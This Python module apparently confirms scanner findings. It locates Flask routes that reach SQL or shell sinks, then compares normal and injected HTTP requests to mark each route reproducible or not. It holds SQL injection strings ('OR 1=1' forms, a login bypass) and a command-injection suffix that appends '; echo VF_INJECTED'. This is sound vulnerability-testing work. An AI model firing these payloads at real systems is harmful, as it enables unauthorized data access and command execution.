import ast
import hashlib
import json
import time
import urllib.error
import urllib.parse
import urllib.request

SQL_RULE = "C02-SQL"
CMD_RULE = "C03-CMD"
NORMAL_CMDS = {
    "/ping": "127.0.0.1",
    "/convert": "sample.png",
    "/backup": "data",
    "/deploy": "staging",
}
INJECT_SUFFIX = "; echo VF_INJECTED"


def _call_name(node):
    parts = []
    current = node
    while isinstance(current, ast.Attribute):
        parts.append(current.attr)
        current = current.value
    if isinstance(current, ast.Name):
        parts.append(current.id)
    return ".".join(reversed(parts))


def _request_param(body):
    for node in ast.walk(body):
        if not isinstance(node, ast.Call):
            continue
        name = _call_name(node.func)
        if name in {"request.args.get", "request.form.get", "request.values.get", "request.json.get"}:
            if node.args and isinstance(node.args[0], ast.Constant) and isinstance(node.args[0].value, str):
                kind = "form" if "form" in name else "args"
                return node.args[0].value, kind
    return "", "args"


def _sink(body):
    for node in ast.walk(body):
        if not isinstance(node, ast.Call):
            continue
        name = _call_name(node.func)
        if name.endswith("execute"):
            return "C02", node.lineno if not node.args else node.args[0].lineno
        shell_true = any(
            keyword.arg == "shell"
            and isinstance(keyword.value, ast.Constant)
            and keyword.value.value is True
            for keyword in node.keywords
        )
        if name in {"os.popen", "os.system"} or (name.startswith("subprocess.") and shell_true):
            return "C03", node.lineno if not node.args else node.args[0].lineno
    return "", 0


def discover_routes(root):
    routes = []
    path = root + "/app/main.py"
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            source = handle.read()
        tree = ast.parse(source)
    except (OSError, SyntaxError):
        return routes
    for node in ast.walk(tree):
        if not isinstance(node, ast.FunctionDef):
            continue
        for decorator in node.decorator_list:
            if not isinstance(decorator, ast.Call):
                continue
            name = _call_name(decorator.func)
            if name not in {"app.get", "app.post", "app.route"}:
                continue
            if not decorator.args or not isinstance(decorator.args[0], ast.Constant):
                continue
            endpoint = decorator.args[0].value
            method = decorator.func.attr.upper()
            if method == "ROUTE":
                method = "GET"
            kind, line = _sink(node)
            if kind not in {"C02", "C03"}:
                continue
            param, param_kind = _request_param(node)
            routes.append(
                {
                    "endpoint": endpoint,
                    "method": method,
                    "param": param,
                    "param_kind": param_kind,
                    "kind": kind,
                    "line": line,
                    "file": "app/main.py",
                }
            )
    routes.sort(key=lambda item: (item["endpoint"], item["method"]))
    return routes


def _values(route):
    kind = route["kind"]
    endpoint = route["endpoint"]
    param = route["param"]
    if kind == "C02":
        if endpoint == "/login":
            return {"username": "alice", "password": "alice-pass"}, {
                "username": "alice' OR '1'='1' --",
                "password": "x",
            }
        payloads = {
            "/search": "%' OR '1'='1",
            "/order": "1 OR 1=1",
            "/profile": "1 OR 1=1",
        }
        return {param: "1"}, {param: payloads.get(endpoint, "1' OR '1'='1")}
    normal = NORMAL_CMDS.get(endpoint, "sample")
    return {param: normal}, {param: normal + INJECT_SUFFIX}


def _digest(text):
    return hashlib.sha256(text.encode("utf-8", "replace")).hexdigest()


def _numeric_max(data):
    best = 0
    if isinstance(data, bool):
        return 0
    if isinstance(data, (int, float)):
        return data
    if isinstance(data, list):
        for item in data:
            best = max(best, _numeric_max(item))
    elif isinstance(data, dict):
        for item in data.values():
            best = max(best, _numeric_max(item))
    return best


def _row_count(data):
    if isinstance(data, list):
        return len(data)
    if isinstance(data, dict):
        if "matched" in data and isinstance(data["matched"], int):
            return int(data["matched"])
        return sum(_row_count(item) for item in data.values())
    return 0


def _shape(text):
    try:
        data = json.loads(text)
    except (ValueError, TypeError):
        return 0, 0
    return _row_count(data), _numeric_max(data)


def _request(opener, base_url, endpoint, method, values, timeout):
    encoded = urllib.parse.urlencode(values)
    if method == "POST":
        request = urllib.request.Request(base_url + endpoint, data=encoded.encode("utf-8"), method="POST")
    else:
        request = urllib.request.Request(base_url + endpoint + "?" + encoded, method="GET")
    with opener.open(request, timeout=timeout) as response:
        return response.read().decode("utf-8", "replace"), int(getattr(response, "status", 200))


def _fetch(opener, base_url, route, values, timeout, retries):
    attempts = 0
    last_error = ""
    while attempts < max(1, retries):
        attempts += 1
        try:
            return _request(opener, base_url, route["endpoint"], route["method"], values, timeout), attempts, ""
        except (urllib.error.URLError, urllib.error.HTTPError, OSError) as exc:
            last_error = type(exc).__name__
            time.sleep(0.05)
    return ("", 0), attempts, last_error


def _judge(route, normal_text, injected_text):
    if route["kind"] == "C02":
        normal_rows, normal_num = _shape(normal_text)
        injected_rows, injected_num = _shape(injected_text)
        return injected_rows > normal_rows or injected_num > normal_num
    if route["endpoint"] == "/convert":
        try:
            normal_code = int(json.loads(normal_text).get("exit_code", 0))
            injected_code = int(json.loads(injected_text).get("exit_code", -1))
        except (ValueError, TypeError, AttributeError):
            return False
        return normal_code != 0 and injected_code == 0
    return "VF_INJECTED" in injected_text and "VF_INJECTED" not in normal_text


def run_plan(base_url, plan, timeout=5.0, retries=3, opener=None):
    opener = opener or urllib.request.build_opener()
    results = []
    for route in plan:
        started = time.time()
        normal_values, injected_values = _values(route)
        (normal_text, normal_status), normal_attempts, normal_error = _fetch(
            opener, base_url, route, normal_values, timeout, retries
        )
        (injected_text, injected_status), injected_attempts, injected_error = _fetch(
            opener, base_url, route, injected_values, timeout, retries
        )
        diff = _judge(route, normal_text, injected_text)
        reproducible = bool(normal_status and injected_status and diff)
        if normal_error or injected_error:
            conclusion = "NOT_REPRODUCIBLE"
        else:
            conclusion = "REPRODUCIBLE" if reproducible else "NOT_REPRODUCIBLE"
        results.append(
            {
                "endpoint": route["endpoint"],
                "method": route["method"],
                "kind": route["kind"],
                "file": route["file"],
                "line": route["line"],
                "normal_digest": _digest(normal_text),
                "injected_digest": _digest(injected_text),
                "behavior_diff": reproducible,
                "conclusion": conclusion,
                "duration_ms": int((time.time() - started) * 1000),
                "retries": normal_attempts + injected_attempts - 2,
            }
        )
    return results